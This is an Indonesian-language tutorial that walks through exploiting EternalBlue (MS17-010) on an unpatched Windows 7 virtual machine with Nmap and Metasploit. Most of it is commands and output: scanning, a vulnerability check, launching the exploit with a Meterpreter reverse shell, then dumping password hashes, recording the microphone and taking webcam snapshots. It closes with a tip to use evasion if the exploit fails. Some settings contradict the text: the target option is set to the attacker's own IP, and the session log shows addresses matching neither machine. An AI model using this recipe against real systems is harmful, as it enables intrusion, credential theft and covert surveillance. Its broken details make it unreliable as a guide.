# Exploit Real Target: Windows 7 SP1 dengan EternalBlue (MS17-010)

## A. Apa Itu EternalBlue?

[EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) adalah sebuah exploit untuk kerentanan [SMB](https://en.wikipedia.org/wiki/Server_Message_Block)v1 (Server Message Block version 1) pada sistem Windows, yang ditemukan oleh [NSA](https://www.nsa.gov/) dan bocor oleh grup [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers).

- Kerentanan ini diberi ID: `CVE-2017-0144`
- Dapat digunakan untuk RCE (remote code execution) tanpa autentikasi.
- Sangat efektif terhadap `Windows XP`, `Vista`, `7`, `8`, `Server 2003`, `2008`, hingga `2012` yang belum di-patch.

## B. Alat dan Bahan

- [Kali Linux](https://www.kali.org) dengan [Metasploit Framework](https://www.metasploit.com/)
- [VirtualBox](https://www.virtualbox.org/)
- [Windows 7 SP1](https://dl.bobpony.com/windows/7/) (belum di-patch MS17-010)
- Koneksi jaringan lokal antara attacker dan target

## C. Langkah-Langkah Eksploitasi EternalBlue

### 1. Pastikan IP Attacker (Kali Linux) Harus 1 Jaringan Dengan IP Windows 7.

**Caranya:**

#### 1. Buka `VirtualBox`

![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/seting%20win7%201.png)

#### 2. Pilih `Windows 7`

![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/seting%20win7%202.png)

#### 3. Klik `Setting`

![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/seting%20win7%203.png)

#### 4. Pilih Tab `Network`

Pada `Adapter 1`, pada bagian  `Attached to:` pilih `Bridge Adapter`. dan untuk bagian `Name:` pilih interface yang sesuai dengan yang ada di sistyem operasi kalian. Disini berhubung saya pake OS Kali Linux saya pilih `wlan0`.

![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/seting%20win7%204.png)
![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/seting%20win7%205.png)

#### 5. Klik `OK`

![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/seting%20win7%206.png)

### 2. Kumpulkan Informasi Target (Windows 7)

**Caranya:**

#### 1. Jalankan Windows 7

Klik Start.

![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/seting%20win7%207.png)

#### 2. Scan Semua Device yang Ada Dijaringan yang Sama Menggunakan Nmap:

```
nmap -sn -T4 192.168.1.0/24
```

**Keterangan:**
- `-sn` : Menggunakan teknik ping scan (disable port scan)
- `-T4` : Templat waktu (semakin tinggi semakin cepat)
 
Hasil output-nya seperti ini:

```
┌──(root㉿fixploit03)-[/home/fixploit03/Desktop]
└─# nmap -sn -T4 192.168.1.0/24                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 20:41 WIB
Nmap scan report for 192.168.1.1
Host is up (0.0040s latency).
MAC Address: 68:58:11:25:43:20 (Fiberhome Telecommunication Technologies)
Nmap scan report for 192.168.1.4
Host is up (0.062s latency).
MAC Address: 1A:64:7D:BB:74:75 (Unknown)
Nmap scan report for 192.168.1.45
Host is up (0.00050s latency).
MAC Address: 08:00:27:96:ED:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.42
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds
```

Dari hasil scan `Nmap` tersebut, ditemukan `4` host aktif yakni: 
- `192.168.1.1`
- `192.168.1.4`
- `192.168.1.45`
- `192.168.1.42`

Untuk mencari target Windows 7, kita harus menggunakan teknik scan OS dari Nmap `(-O)` caranya:

```
nmap -sS -T4 -O -iL host.txt
```

**Keterangan:**
- `-sS` : Menggunakan teknik SYN scan (stealth)
- `-T4` : Templat waktu (semakin tinggi semakin cepat)
- `-O` : Mengaktifkan scan OS (sistem operasi)
- `-iL` : File yang berisi daftar host yang ingin di-scan: `host.txt`



Hasil output-nya seperti ini:

```
┌──(root㉿fixploit03)-[/home/fixploit03/Desktop]
└─# nmap -sS -T4 -O -iL host.txt                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 20:49 WIB
Nmap scan report for 192.168.1.45
Host is up (0.00064s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:96:ED:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop

Nmap scan report for 192.168.1.42
Host is up (0.000057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Device type: general purpose
Running: Linux 2.6.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
OS details: Linux 2.6.32, Linux 5.0 - 6.2
Network Distance: 0 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (2 hosts up) scanned in 5.81 seconds
```

Dari hasil scan `Nmap` tersebut, ditemukan IP Address yang menggunakan sistem operasi Windows 7 yakni: `192.168.1.45`.

#### 3. Cek Apakah Target Rentan atau Tidak

**Caranya:**

**1. Jalankan Metasploit:**

```
msfconsole
```

**2. Cari Modul EternalBlue:**

```
search EternalBlue
```

**3. Gunakan Modul `auxiliary/scanner/smb/smb_ms17_010` Untuk Mencari Tahu Apakah Target Rentan atau Tidak:**

```
use auxiliary/scanner/smb/smb_ms17_010
```

**4. Lihat Opsi Konfigurasi:**

```
show options
```

Hasil output-nya seperti ini:

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options 

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                            Required  Description
   ----         ---------------                            --------  -----------
   CHECK_ARCH   true                                       no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                       no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                      no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/word  yes       List of named pipes to check
                lists/named_pipes.txt
   RHOSTS                                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                                                     asics/using-metasploit.html
   RPORT        445                                        yes       The SMB service port (TCP)
   SMBDomain    .                                          no        The Windows domain to use for authentication
   SMBPass                                                 no        The password for the specified username
   SMBUser                                                 no        The username to authenticate as
   THREADS      1                                          yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > 
```

**5. Setting Target:**

```
set RHOSTS 192.168.1.45
Set RPORT 445
set CHECK_ARCH true
set CHECK_DOPU true
set verbose true
```

**6. Jalankan:**

```
run
```

Jika hasil output-nya seperti ini:

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[*] 192.168.1.45:445      - Connected to \\192.168.1.45\IPC$ with TID = 2048
[*] 192.168.1.45:445      - Received STATUS_INSUFF_SERVER_RESOURCES with FID = 0
[+] 192.168.1.45:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.45:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) >
```

Itu artinya target rentan terhadap EternalBlue.

### 4. Eksplotasi Target

**Caranya:**

**1. Pindah ke Modul Utama Metasploit:**

```
back
```

**2. Gunakan Modul `exploit/windows/smb/ms17_010_eternalblue` Untuk Mengekploitasi Kerentanan SMBv1 (EternalBLue):**

```
use exploit/windows/smb/ms17_010_eternalblue
```

**3. Lihat Opsi Konfigurasi:**

```
show options
```

Hasil output-nya seperti ini:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
                                             tml
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windo
                                             ws 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7
                                             , Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                             Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.42     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

**4. Lihat IP Address Kita:**

```
ifconfig
```

Hasil output-nya seperti ini:

```
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.42  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::5727:a89e:6188:d200  prefixlen 64  scopeid 0x20<link>
        ether 00:c0:ca:b2:b8:a5  txqueuelen 1000  (Ethernet)
        RX packets 3317755  bytes 4611397255 (4.2 GiB)
        RX errors 0  dropped 104  overruns 0  frame 0
        TX packets 1088943  bytes 190597327 (181.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Itu artinya IP Address kita adalah `192.168.1.42`.

**5. Atur Parameter:**

```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.1.42
Set LPORT 4444
set VERIFY_ARCH true
set VERIFY_TARGET true
set EXITFUNC thread
set target 1
set verbose true
```

**6. Jalankan Exploit:**

```
exploit
```

Jika berhasil, kamu akan mendapatkan sesi Meterpreter:

```
[*] Sending stage (203846 bytes) to 192.168.1.10
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened (192.168.1.5:4444 -> 192.168.1.10:49158) at 2025-05-07 20:27:03 +0700

meterpreter > 
```

Setelah berhasil mendapatkan sesi Meterpreter, kamu bisa melakukan beberapa hal diantaranya:

1. Melihat informasi sistem target:

   ```
   sysinfo
   ```

2. Menampilkan User ID (UID):

   ```
   getuid
   ```

3. Mengekstrak hash password pengguna:

   ```
   hashdump
   ```                    

4. Membuka command shell (cmd.exe) dari mesin target:

   ```
   shell
   ```                    

5. Upload file ke mesin target:

   ```
   upload 
   ```           

6. Download file dari mesin target:
 
   ```
   download
   ```

7. Rekam suara microphone dari mesin target:

   ```
   record_mic 
   ```     

8. Ambil snapshot webcam dari mesin target:

   ```
   webcam_snap
   ```

Dan masih banyak lagi.

## D. Tips Keamanan dan Etika

- Gunakan hanya di lab atau uji coba yang kamu kelola sendiri.
- Jangan gunakan di jaringan orang lain tanpa izin.
- Windows 7 SP1 sudah tidak mendapatkan update, tapi banyak masih digunakan di sistem tua, gunakan untuk pelatihan, bukan penyerangan nyata.

## Tips Tambahan

- Jika exploit gagal, coba gunakan `encoder` atau teknik `evasion`.
